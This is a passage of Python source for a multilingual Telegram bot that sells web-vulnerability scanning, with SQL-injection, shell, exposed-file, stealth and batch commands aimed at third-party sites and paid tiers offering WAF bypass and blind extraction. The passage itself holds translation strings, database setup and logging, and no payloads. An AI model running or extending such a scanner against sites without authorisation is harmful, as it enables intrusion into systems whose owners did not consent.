        'en': '❌ Use: /rescan &lt;comando&gt; &lt;target&gt;\\nExample: /rescan sqli example.com',
        'es': '❌ Usa: /rescan &lt;comando&gt; &lt;target&gt;\\nEjemplo: /rescan sqli example.com',
    },
    '❌ Use: /ssl &lt;url&gt;\\nExemplo: /ssl google.com': {
        'en': '❌ Use: /ssl &lt;url&gt;\\nExample: /ssl google.com',
        'es': '❌ Usa: /ssl &lt;url&gt;\\nEjemplo: /ssl google.com',
    },
    '❌ Use: /headers &lt;url&gt;\\nExemplo: /headers google.com': {
        'en': '❌ Use: /headers &lt;url&gt;\\nExample: /headers google.com',
        'es': '❌ Usa: /headers &lt;url&gt;\\nEjemplo: /headers google.com',
    },
    '❌ Use: /cors &lt;url&gt;\\nExemplo: /cors google.com': {
        'en': '❌ Use: /cors &lt;url&gt;\\nExample: /cors google.com',
        'es': '❌ Usa: /cors &lt;url&gt;\\nEjemplo: /cors google.com',
    },
    '❌ Use: /robots &lt;url&gt;\\nExemplo: /robots google.com': {
        'en': '❌ Use: /robots &lt;url&gt;\\nExample: /robots google.com',
        'es': '❌ Usa: /robots &lt;url&gt;\\nEjemplo: /robots google.com',
    },
    '❌ Use: /sitemap &lt;url&gt;\\nExemplo: /sitemap google.com': {
        'en': '❌ Use: /sitemap &lt;url&gt;\\nExample: /sitemap google.com',
        'es': '❌ Usa: /sitemap &lt;url&gt;\\nEjemplo: /sitemap google.com',
    },
    '❌ Use: /tech &lt;url&gt;\\nExemplo: /tech google.com': {
        'en': '❌ Use: /tech &lt;url&gt;\\nExample: /tech google.com',
        'es': '❌ Usa: /tech &lt;url&gt;\\nEjemplo: /tech google.com',
    },
    '❌ Use: /exposed &lt;url&gt;\\nExemplo: /exposed google.com': {
        'en': '❌ Use: /exposed &lt;url&gt;\\nExample: /exposed google.com',
        'es': '❌ Usa: /exposed &lt;url&gt;\\nEjemplo: /exposed google.com',
    },
    '❌ Use: /backup &lt;url&gt;\\nExemplo: /backup google.com': {
        'en': '❌ Use: /backup &lt;url&gt;\\nExample: /backup google.com',
        'es': '❌ Usa: /backup &lt;url&gt;\\nEjemplo: /backup google.com',
    },
    '❌ Use: /api &lt;url&gt;\\nExemplo: /api google.com': {
        'en': '❌ Use: /api &lt;url&gt;\\nExample: /api google.com',
        'es': '❌ Usa: /api &lt;url&gt;\\nEjemplo: /api google.com',
    },
    '❌ Use: /shell &lt;url&gt;\\nExemplo: /shell google.com': {
        'en': '❌ Use: /shell &lt;url&gt;\\nExample: /shell google.com',
        'es': '❌ Usa: /shell &lt;url&gt;\\nEjemplo: /shell google.com',
    },
    '❌ Use: /config &lt;url&gt;\\nExemplo: /config google.com': {
        'en': '❌ Use: /config &lt;url&gt;\\nExample: /config google.com',
        'es': '❌ Usa: /config &lt;url&gt;\\nEjemplo: /config google.com',
    },
    '❌ Use: /traceroute &lt;ip&gt;\\nExemplo: /traceroute 8.8.8.8': {
        'en': '❌ Use: /traceroute &lt;ip&gt;\\nExample: /traceroute 8.8.8.8',
        'es': '❌ Usa: /traceroute &lt;ip&gt;\\nEjemplo: /traceroute 8.8.8.8',
    },
    '❌ Use: /whois &lt;domain&gt;\\nExemplo: /whois google.com': {
        'en': '❌ Use: /whois &lt;domain&gt;\\nExample: /whois google.com',
        'es': '❌ Usa: /whois &lt;domain&gt;\\nEjemplo: /whois google.com',
    },
    '❌ Use: /ip &lt;ip&gt;\\nExemplo: /ip 8.8.8.8': {
        'en': '❌ Use: /ip &lt;ip&gt;\\nExample: /ip 8.8.8.8',
        'es': '❌ Usa: /ip &lt;ip&gt;\\nEjemplo: /ip 8.8.8.8',
    },
    '❌ Use: /rate &lt;url&gt;\\nExemplo: /rate google.com': {
        'en': '❌ Use: /rate &lt;url&gt;\\nExample: /rate google.com',
        'es': '❌ Usa: /rate &lt;url&gt;\\nEjemplo: /rate google.com',
    },
    '❌ Use: /compare &lt;url1&gt; &lt;url2&gt;\\nExemplo: /compare google.com example.com': {
        'en': '❌ Use: /compare &lt;url1&gt; &lt;url2&gt;\\nExample: /compare google.com example.com',
        'es': '❌ Usa: /compare &lt;url1&gt; &lt;url2&gt;\\nEjemplo: /compare google.com example.com',
    },
    '❌ Use: /history &lt;url&gt;\\nExemplo: /history google.com': {
        'en': '❌ Use: /history &lt;url&gt;\\nExample: /history google.com',
        'es': '❌ Usa: /history &lt;url&gt;\\nEjemplo: /history google.com',
    },
    '❌ Use: /pdf &lt;comando&gt; &lt;url&gt;\\nExemplo: /pdf sqli google.com/?id=1': {
        'en': '❌ Use: /pdf &lt;comando&gt; &lt;url&gt;\\nExample: /pdf sqli google.com/?id=1',
        'es': '❌ Usa: /pdf &lt;comando&gt; &lt;url&gt;\\nEjemplo: /pdf sqli google.com/?id=1',
    },
    '❌ Use: /schedule &lt;minutos&gt; &lt;comando&gt; &lt;url&gt;\\nExemplo: /schedule 30 sqli google.com/?id=1': {
        'en': '❌ Use: /schedule &lt;minutos&gt; &lt;comando&gt; &lt;url&gt;\\nExample: /schedule 30 sqli google.com/?id=1',
        'es': '❌ Usa: /schedule &lt;minutos&gt; &lt;comando&gt; &lt;url&gt;\\nEjemplo: /schedule 30 sqli google.com/?id=1',
    },
    '❌ Use: /cooldown &lt;user_id&gt; &lt;limite&gt; [janela]\\nExemplo: /cooldown 123456 5 60': {
        'en': '❌ Use: /cooldown &lt;user_id&gt; &lt;limite&gt; [janela]\\nExample: /cooldown 123456 5 60',
        'es': '❌ Usa: /cooldown &lt;user_id&gt; &lt;limite&gt; [janela]\\nEjemplo: /cooldown 123456 5 60',
    },
    '❌ Use: /vip &lt;add|remove&gt; &lt;user_id&gt;\\nExemplo: /vip add 123456': {
        'en': '❌ Use: /vip &lt;add|remove&gt; &lt;user_id&gt;\\nExample: /vip add 123456',
        'es': '❌ Usa: /vip &lt;add|remove&gt; &lt;user_id&gt;\\nEjemplo: /vip add 123456',
    },
    '❌ Use: /vip &lt;add|remove&gt; &lt;user_id&gt;': {
        'en': '❌ Use: /vip &lt;add|remove&gt; &lt;user_id&gt;',
        'es': '❌ Usa: /vip &lt;add|remove&gt; &lt;user_id&gt;',
    },
    '❌ Use: /log &lt;user_id&gt; ou /log audit\\nExemplo: /log 123456': {
        'en': '❌ Use: /log &lt;user_id&gt; or /log audit\\nExample: /log 123456',
        'es': '❌ Usa: /log &lt;user_id&gt; o /log audit\\nEjemplo: /log 123456',
    },
    '❌ Use: /broadcast &lt;minutos&gt; &lt;texto&gt;\\nExemplo: /broadcast 60 Bot vai cair para manutenção em 1 hora': {
        'en': '❌ Use: /broadcast &lt;minutos&gt; &lt;texto&gt;\\nExample: /broadcast 60 Bot vai cair para manutenção em 1 hora',
        'es': '❌ Usa: /broadcast &lt;minutos&gt; &lt;texto&gt;\\nEjemplo: /broadcast 60 Bot vai cair para manutenção em 1 hora',
    },
    '❌ Use: /stealth &lt;comando&gt; &lt;url&gt;\\nExemplo: /stealth sqli google.com/?id=1': {
        'en': '❌ Use: /stealth &lt;comando&gt; &lt;url&gt;\\nExample: /stealth sqli google.com/?id=1',
        'es': '❌ Usa: /stealth &lt;comando&gt; &lt;url&gt;\\nEjemplo: /stealth sqli google.com/?id=1',
    },
    '❌ Use: /notify &lt;url&gt;\\nExemplo: /notify google.com\\nUse /notify off para desativar todas.': {
        'en': '❌ Use: /notify &lt;url&gt;\\nExample: /notify google.com\\nUse /notify off para desativar todas.',
        'es': '❌ Usa: /notify &lt;url&gt;\\nEjemplo: /notify google.com\\nUse /notify off para desativar todas.',
    },
    '❌ Use: /scanall &lt;url&gt;\\nExemplo: /scanall google.com': {
        'en': '❌ Use: /scanall &lt;url&gt;\\nExample: /scanall google.com',
        'es': '❌ Usa: /scanall &lt;url&gt;\\nEjemplo: /scanall google.com',
    },
    '❌ Use: /deep &lt;url&gt;\\nExemplo: /deep site.com/?id=1': {
        'en': '❌ Use: /deep &lt;url&gt;\\nExample: /deep site.com/?id=1',
        'es': '❌ Usa: /deep &lt;url&gt;\\nEjemplo: /deep site.com/?id=1',
    },
    '❌ Use: /quick &lt;url&gt;\\nExemplo: /quick google.com': {
        'en': '❌ Use: /quick &lt;url&gt;\\nExample: /quick google.com',
        'es': '❌ Usa: /quick &lt;url&gt;\\nEjemplo: /quick google.com',
    },
    '❌ Use: /batch &lt;comando&gt; &lt;url1&gt; &lt;url2&gt; ...\\nExemplo: /batch sqli site1.com site2.com site3.com': {
        'en': '❌ Use: /batch &lt;comando&gt; &lt;url1&gt; &lt;url2&gt; ...\\nExample: /batch sqli site1.com site2.com site3.com',
        'es': '❌ Usa: /batch &lt;comando&gt; &lt;url1&gt; &lt;url2&gt; ...\\nEjemplo: /batch sqli site1.com site2.com site3.com',
    },
    '❌ Use: /http &lt;url&gt;\\nExemplo: /http google.com': {
        'en': '❌ Use: /http &lt;url&gt;\\nExample: /http google.com',
        'es': '❌ Usa: /http &lt;url&gt;\\nEjemplo: /http google.com',
    },
    '❌ Use: /sslchain &lt;url&gt;\\nExemplo: /sslchain google.com': {
        'en': '❌ Use: /sslchain &lt;url&gt;\\nExample: /sslchain google.com',
        'es': '❌ Usa: /sslchain &lt;url&gt;\\nEjemplo: /sslchain google.com',
    },
    '❌ Use: /watch &lt;url&gt; [intervalo_min]\\nExemplo: /watch google.com 10\\nUse /watch off para desativar.': {
        'en': '❌ Use: /watch &lt;url&gt; [intervalo_min]\\nExample: /watch google.com 10\\nUse /watch off para desativar.',
        'es': '❌ Usa: /watch &lt;url&gt; [intervalo_min]\\nEjemplo: /watch google.com 10\\nUse /watch off para desativar.',
    },
    '❌ Use: /report &lt;url&gt;\\nExemplo: /report google.com': {
        'en': '❌ Use: /report &lt;url&gt;\\nExample: /report google.com',
        'es': '❌ Usa: /report &lt;url&gt;\\nEjemplo: /report google.com',
    },
    '❌ Comando inválido: /': {
        'en': '❌ Invalid command: /',
        'es': '❌ Comando inválido: /',
    },
    '❌ Comando /': {
        'en': '❌ Command /',
        'es': '❌ Comando /',
    },
    'não suportado para rescan.': {
        'en': 'not supported for rescan.',
        'vi': 'không được hỗ trợ để scan lại.',
        'id': 'tidak didukung untuk rescan.',
        'es': 'no soportado para rescan.',
    },
    'não suportado em batch.': {
        'en': 'not supported in batch mode.',
        'vi': 'không được hỗ trợ trong batch.',
        'id': 'tidak didukung dalam batch.',
        'es': 'no soportado en modo batch.',
    },
    'não suportado em modo stealth.': {
        'en': 'not supported in stealth mode.',
        'vi': 'không được hỗ trợ trong chế độ stealth.',
        'id': 'tidak didukung dalam mode stealth.',
        'es': 'no soportado en modo stealth.',
    },
    'não suportado para PDF.': {
        'en': 'not supported for PDF.',
        'es': 'no soportado para PDF.',
    },
    'não suportado em scans agendados.': {
        'en': 'not supported in scheduled scans.',
        'vi': 'không được hỗ trợ trong scan lên lịch.',
        'id': 'tidak didukung dalam scan terjadwal.',
        'es': 'no soportado en scans programados.',
    },
    'Comandos aceitos: ': {
        'en': 'Accepted commands: ',
        'es': 'Comandos aceptados: ',
        },
    # Menu translations
    '🎯 explorar vulnerabilidades': {
        'en': '🎯 Explore Vulnerabilities',
        'es': '🎯 Explorar Vulnerabilidades',
        'vi': '🎯 Khám phá Lỗ hổng',
        'id': '🎯 Jelajahi Kerentanan',
    },
    'selecione uma ferramenta. você precisará inserir o alvo (url, domínio ou ip) na próxima mensagem.': {
        'en': 'Select a tool. You will need to enter the target (URL, domain or IP) in the next message.',
        'es': 'Seleccione una herramienta. Necesitará ingresar el objetivo (URL, dominio o IP) en el próximo mensaje.',
        'vi': 'Chọn một công cụ. Bạn sẽ cần nhập mục tiêu (URL, tên miền hoặc IP) trong tin nhắn tiếp theo.',
        'id': 'Pilih alat. Anda perlu memasukkan target (URL, domain atau IP) di pesan berikutnya.',
    },
    '🔍 reconhecimento': {
        'en': '🔍 Reconnaissance',
        'es': '🔍 Reconocimiento',
        'vi': '🔍 Trinh sát',
        'id': '🔍 Pengintaian',
    },
    'ferramentas de reconhecimento e informação sobre o alvo.': {
        'en': 'Reconnaissance tools and information about the target.',
        'es': 'Herramientas de reconocimiento e información sobre el objetivo.',
        'vi': 'Công cụ trinh sát và thông tin về mục tiêu.',
        'id': 'Alat pengintaian dan informasi tentang target.',
    },
    'selecione uma ferramenta para começar.': {
        'en': 'Select a tool to begin.',
        'es': 'Seleccione una herramienta para comenzar.',
        'vi': 'Chọn một công cụ để bắt đầu.',
        'id': 'Pilih alat untuk memulai.',
    },
    '🛡️ auditoria de segurança': {
        'en': '🛡️ Security Audit',
        'es': '🛡️ Auditoría de Seguridad',
        'vi': '🛡️ Kiểm tra Bảo mật',
        'id': '🛡️ Audit Keamanan',
    },
    'ferramentas de auditoria e análise de segurança.': {
        'en': 'Audit and security analysis tools.',
        'es': 'Herramientas de auditoría y análisis de seguridad.',
        'vi': 'Công cụ kiểm tra và phân tích bảo mật.',
        'id': 'Alat audit dan analisis keamanan.',
    },
    '📂 arquivos & diretórios': {
        'en': '📂 Files & Directories',
        'es': '📂 Archivos & Directorios',
        'vi': '📂 Tệp & Thư mục',
        'id': '📂 File & Direktori',
    },
    'ferramentas para buscar arquivos expostos, diretórios e configurações.': {
        'en': 'Tools to search for exposed files, directories and configurations.',
        'es': 'Herramientas para buscar archivos expuestos, directorios y configuraciones.',
        'vi': 'Công cụ tìm kiếm tệp, thư mục và cấu hình bị lộ.',
        'id': 'Alat untuk mencari file, direktori, dan konfigurasi yang terekspos.',
    },
    '⭐ ferramentas vip': {
        'en': '⭐ VIP Tools',
        'es': '⭐ Herramientas VIP',
        'vi': '⭐ Công cụ VIP',
        'id': '⭐ Alat VIP',
    },
    '👑 ferramentas dono': {
        'en': '👑 Owner Tools',
        'es': '👑 Herramientas de Propietario',
        'vi': '👑 Công cụ Owner',
        'id': '👑 Alat Owner',
    },
    'acesso exclusivo: apenas donos': {
        'en': 'Exclusive Access: Owners Only',
        'es': 'Acceso Exclusivo: Solo Propietarios',
        'vi': 'Truy cập Độc quyền: Chỉ Owner',
        'id': 'Akses Eksklusif: Hanya Owner',
    },
    'os scanners owner incluem 0-day patterns, blind extraction, full waf bypass, análise forense, pentest automation e osint intelligence.': {
        'en': 'Owner scanners include 0-day patterns, blind extraction, full WAF bypass, forensic analysis, pentest automation and OSINT intelligence.',
        'es': 'Los scanners Owner incluyen patrones 0-day, extracción blind, bypass completo de WAF, análisis forense, automatización pentest e inteligencia OSINT.',
        'vi': 'Scanner Owner bao gồm pattern 0-day, blind extraction, bypass WAF, phân tích forensics, tự động pentest và trí tuệ OSINT.',
        'id': 'Scanner Owner mencakup pattern 0-day, blind extraction, full WAF bypass, analisis forensik, otomasi pentest, dan intelijen OSINT.',
    },
    'selecione uma ferramenta para começar': {
        'en': 'Select a tool to begin.',
        'es': 'Seleccione una herramienta para comenzar.',
        'vi': 'Chọn một công cụ để bắt đầu.',
        'id': 'Pilih alat untuk memulai.',
    },
    'selecione uma categoria para começar:': {
        'en': 'Select a category to begin:',
        'es': 'Seleccione una categoría para comenzar:',
        'vi': 'Chọn một danh mục để bắt đầu:',
        'id': 'Pilih kategori untuk memulai:',
    },
    'selecione uma ferramenta vip para começar.': {
        'en': 'Select a VIP tool to begin.',
        'es': 'Seleccione una herramienta VIP para comenzar.',
        'vi': 'Chọn công cụ VIP để bắt đầu.',
        'id': 'Pilih alat VIP untuk memulai.',
    },
    'scanners vip possuem 3x mais payloads, waf bypass, análise profunda e detecção avançada.': {
        'en': 'VIP scanners have 3x more payloads, WAF bypass, deep analysis and advanced detection.',
        'es': 'Los scanners VIP tienen 3x más payloads, bypass WAF, análisis profundo y detección avanzada.',
        'vi': 'Scanner VIP có 3x payload, bypass WAF, phân tích sâu và phát hiện nâng cao.',
        'id': 'Scanner VIP memiliki 3x payload, bypass WAF, analisis mendalam, dan deteksi lanjutan.',
    },
    'esta seção é exclusiva para membros vip.': {
        'en': 'This section is exclusive to VIP members.',
        'es': 'Esta sección es exclusiva para miembros VIP.',
        'vi': 'Mục này chỉ dành cho thành viên VIP.',
        'id': 'Bagian ini eksklusif untuk anggota VIP.',
    },
    'esta seção é exclusiva para donos.': {
        'en': 'This section is exclusive to Owners.',
        'es': 'Esta sección es exclusiva para Propietarios.',
        'vi': 'Mục này chỉ dành cho Owner.',
        'id': 'Bagian ini eksklusif untuk Owner.',
    },
    'voltar ao menu': {
        'en': 'Back to Menu',
        'es': 'Volver al Menú',
        'vi': 'Quay lại Menu',
        'id': 'Kembali ke Menu',
        },
}

def _translate(text: str, lang: str) -> str:
    """Translate a message string. Falls back to original PT text if no translation."""
    if lang == 'pt' or not text:
        return text
    key = text.lower().strip().rstrip('.')
    if key not in _TRANSLATIONS:
        # Try with punctuation removed
        key2 = key.rstrip('.!?')
        if key2 in _TRANSLATIONS:
            key = key2
        else:
            return text
    t_dict = _TRANSLATIONS[key]
    return t_dict.get(lang, text)


def t(user_id: int, pt_text: str) -> str:
    """Translate a message for the given user's language.
    Usage: t(user_id, "Acess negado!") -> returns EN/ES/PT version."""
    lang = get_user_lang(user_id)
    return _translate(pt_text, lang)

def load_vip_users():
    """Load VIP users from DB on startup"""
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT user_id FROM vip_users")
            for row in c.fetchall():
                VIP_USERS.add(row[0])
    except:
        pass

def is_vip(user_id):
    """Check if user is VIP (no rate limit)"""
    return user_id in VIP_USERS

def get_user_rate_limit(user_id):
    """Get rate limit for user (VIP = unlimited, custom = custom, default = 10/min)"""
    if is_vip(user_id) or is_owner(user_id):
        return 999, 60  # Effectively unlimited
    if user_id in CUSTOM_RATE_LIMITS:
        cl = CUSTOM_RATE_LIMITS[user_id]
        return cl['limit'], cl['window']
    return USER_CMD_LIMIT, USER_CMD_WINDOW

def audit_log(user_id, username, action, details):
    """Log an audit event"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO audit_log (user_id, username, action, details, timestamp) VALUES (?, ?, ?, ?, ?)",
                      (user_id, username, action, details[:500], now))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] audit_log: {e}")

def load_banned_users():
    """Load banned users from DB on startup"""
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT user_id FROM banned_users")
            for row in c.fetchall():
                BANNED_USERS.add(row[0])
    except:
        pass

# NOTE: sanitize_url, get_cached_result, set_cached_result removed (unused/dead)
# URL sanitization is handled by extract_hostname(); caching uses db_cache_get/set.

# Error log file
def log_error(module, error):
    """Log error to file with timestamp"""
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] [{module}] {error}\n"
    try:
        with open(ERROR_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(line)
    except:
        pass
    print(f"[ERROR LOG] {module}: {error}")

# Progress tracking for long-running scans
SCAN_PROGRESS = {}  # scan_id -> {current, total, message, chat_id}

def send_progress(chat_id, scan_id, current, total, message=""):
    """Send progress update for long-running scans"""
    pct = int((current / total) * 100) if total > 0 else 0
    progress_msg = f"⏳ <b>{message}</b>\n📊 Progresso: {current}/{total} ({pct}%)"
    try:
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": chat_id,
            "text": progress_msg,
            "parse_mode": "HTML"
        }, timeout=5)
        if resp and resp.status_code == 200:
            msg_id = resp.json().get('result', {}).get('message_id')
            SCAN_PROGRESS[scan_id] = {'msg_id': msg_id, 'chat_id': chat_id, 'current': current, 'total': total}
            return msg_id
    except:
        pass
    return None

def edit_progress(msg_id, chat_id, current, total, message=""):
    """Edit a progress message with updated percentage"""
    if not msg_id:
        return
    pct = int((current / total) * 100) if total > 0 else 0
    progress_msg = f"⏳ <b>{message}</b>\n📊 Progresso: {current}/{total} ({pct}%)"
    try:
        HTTP_SESSION.post(f"{API_URL}/editMessageText", json={
            "chat_id": chat_id,
            "message_id": msg_id,
            "text": progress_msg,
            "parse_mode": "HTML"
        }, timeout=5)
    except:
        pass

def finish_progress(msg_id, chat_id, final_message):
    """Delete the progress message after scan completes"""
    if not msg_id:
        return
    try:
        HTTP_SESSION.post(f"{API_URL}/deleteMessage", json={
            "chat_id": chat_id,
            "message_id": msg_id
        }, timeout=5)
    except:
        pass

# ═══════════════════════════════════════════════════════════════
#  DATABASE - LOG DE USUÁRIOS
# ═══════════════════════════════════════════════════════════════
# Use Termux home directory to avoid Scoped Storage issues on Android
DB_DIR = os.path.join(os.path.expanduser("~"), ".mega3_bot")
os.makedirs(DB_DIR, exist_ok=True)
DB_PATH = os.path.join(DB_DIR, "mega3_bot.db")
ERROR_LOG_PATH = os.path.join(DB_DIR, "error_log.txt")

def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            is_owner INTEGER DEFAULT 0,
            first_seen TEXT,
            last_seen TEXT,
            command_count INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            command TEXT,
            target TEXT,
            timestamp TEXT,
            result_summary TEXT
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_logs_user_id ON logs(user_id)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_logs_username ON logs(username)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp DESC)')
        c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            reason TEXT,
            banned_at TEXT,
            banned_by INTEGER
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS owner_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            command TEXT,
            timestamp TEXT
        )''')
        # V4.3: Feedback channel
        c.execute('''CREATE TABLE IF NOT EXISTS feedback (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            message TEXT,
            timestamp TEXT,
            channel_msg_id INTEGER DEFAULT 0
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_feedback_user_id ON feedback(user_id)')
        # V4.3: Bug reports channel
        c.execute('''CREATE TABLE IF NOT EXISTS bug_reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            message TEXT,
            timestamp TEXT,
            channel_msg_id INTEGER DEFAULT 0
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_bug_reports_user_id ON bug_reports(user_id)')
        # V4.3: DB-backed result cache
        c.execute('''CREATE TABLE IF NOT EXISTS scan_cache (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cmd TEXT NOT NULL,
            target TEXT NOT NULL,
            result TEXT,
            created_at REAL,
            UNIQUE(cmd, target)
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_scan_cache_key ON scan_cache(cmd, target)')
        # V5.0: VIP users table
        c.execute('''CREATE TABLE IF NOT EXISTS vip_users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            added_at TEXT,
            added_by INTEGER
        )''')
        # V5.0: Scheduled tasks table
        c.execute('''CREATE TABLE IF NOT EXISTS scheduled_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            chat_id TEXT NOT NULL,
            cmd TEXT NOT NULL,
            target TEXT NOT NULL,
            scheduled_time REAL NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at TEXT
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_scheduled_status ON scheduled_tasks(status)')
        # V5.0: Site monitoring table
        c.execute('''CREATE TABLE IF NOT EXISTS site_monitor (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            target TEXT NOT NULL,
            chat_id TEXT NOT NULL,
            last_status INTEGER DEFAULT 0,
            last_check REAL DEFAULT 0,
            UNIQUE(user_id, target)
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_site_monitor_target ON site_monitor(target)')
        # V5.1: Add watch columns to site_monitor (migration)
        try:
            c.execute("ALTER TABLE site_monitor ADD COLUMN content_hash TEXT DEFAULT ''")
        except:
            pass
        try:
            c.execute("ALTER TABLE site_monitor ADD COLUMN watch_interval INTEGER DEFAULT 5")
        except:
            pass
        try:
            c.execute("ALTER TABLE site_monitor ADD COLUMN watch_type TEXT DEFAULT 'status'")
        except:
            pass
        # V5.0: Audit log table
        c.execute('''CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            action TEXT,
            details TEXT,
            timestamp TEXT
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_audit_user ON audit_log(user_id)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_log(timestamp DESC)')
        # V4.3: Active scan tasks (for /stop)
        c.execute('''CREATE TABLE IF NOT EXISTS scan_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            scan_type TEXT NOT NULL,
            target TEXT NOT NULL,
            started_at REAL,
            status TEXT DEFAULT 'running',
            progress_msg_id INTEGER DEFAULT 0,
            chat_id TEXT DEFAULT ''
        )''')
        conn.commit()

def log_user(user_id, username, first_name, last_name):
    is_owner = 1 if user_id in OWNERS else 0
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            # FIX v3.9: UPSERT now updates ALL fields including username/first_name/last_name
            c.execute("""INSERT INTO users (id, username, first_name, last_name, is_owner, first_seen, last_seen, command_count)
                         VALUES (?, ?, ?, ?, ?, ?, ?, 1)
                         ON CONFLICT(id) DO UPDATE SET
                            username = excluded.username,
                            first_name = excluded.first_name,
                            last_name = excluded.last_name,
                            is_owner = excluded.is_owner,
                            last_seen = excluded.last_seen,
                            command_count = command_count + 1""",
                      (user_id, username, first_name, last_name, is_owner, now, now))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] log_user: {e}")

def log_command(user_id, username, command, target, result_summary=""):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO logs (user_id, username, command, target, timestamp, result_summary) VALUES (?, ?, ?, ?, ?, ?)",
                      (user_id, username, command, target, now, result_summary[:500]))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] log_command: {e}")

def log_owner_command(user_id, username, command):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO owner_logs (user_id, username, command, timestamp) VALUES (?, ?, ?, ?)",
                      (user_id, username, command, now))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] log_owner_command: {e}")

def get_recent_logs(limit=20):
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            # FIX: parameterized LIMIT
            c.execute("SELECT * FROM logs ORDER BY id DESC LIMIT ?", (limit,))
            rows = [dict(r) for r in c.fetchall()]
            return rows
    except Exception as e:
        print(f"[DB Error] get_recent_logs: {e}")
        return []

def get_user_logs(user_id, limit=20):
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT * FROM logs WHERE user_id = ? ORDER BY id DESC LIMIT ?", (user_id, limit))
            rows = [dict(r) for r in c.fetchall()]
            return rows
    except Exception as e:
        print(f"[DB Error] get_user_logs: {e}")
        return []

def get_user_stats():
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            # PERF: Single query instead of 4 separate queries
            c.execute("""SELECT
                (SELECT COUNT(*) FROM users) as total,
                (SELECT COUNT(*) FROM users WHERE is_owner = 1) as owners,
                (SELECT COUNT(*) FROM users WHERE is_owner = 0) as regular,
                (SELECT COUNT(*) FROM logs) as commands
            """)
            row = c.fetchone()
            return {"total": row[0], "owners": row[1], "regular": row[2], "commands": row[3]}
    except Exception as e:
        print(f"[DB Error] get_user_stats: {e}")
        return {"total": 0, "owners": 2, "regular": 0, "commands": 0}

def get_db_dump():
    dump = "=== USERS ===\n"
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()

            c.execute("SELECT * FROM users")
            for r in c.fetchall():
                d = dict(r)
                dump += f"ID:{d['id']} @{d['username']} | {d['first_name']} {d['last_name'] or ''} | Owner:{'Yes' if d['is_owner'] else 'No'} | Cmds:{d['command_count']} | First:{d['first_seen']} | Last:{d['last_seen']}\n"

            dump += "\n=== LOGS ===\n"
            c.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 50")
            for r in c.fetchall():
                d = dict(r)
                dump += f"#{d['id']} @{d['username']} /{d['command']} {d['target'] or ''} [{d['timestamp']}]\n"

            dump += "\n=== OWNER LOGS ===\n"
            c.execute("SELECT * FROM owner_logs ORDER BY id DESC LIMIT 20")
            for r in c.fetchall():
                d = dict(r)
                dump += f"#{d['id']} @{d['username']} /{d['command']} [{d['timestamp']}]\n"
    except Exception as e:
        dump += f"\n[DB Error] {e}\n"
    return dump

init_db()
load_banned_users()
load_vip_users()

# ═══════════════════════════════════════════════════════════════
#  TELEGRAM HELPERS
# ═══════════════════════════════════════════════════════════════
def _rate_limit_wait(chat_id):
    """Prevent Telegram 429 rate limit by spacing messages"""
    global LAST_SEND_TIME, LAST_SEND_TIME_CLEANUP
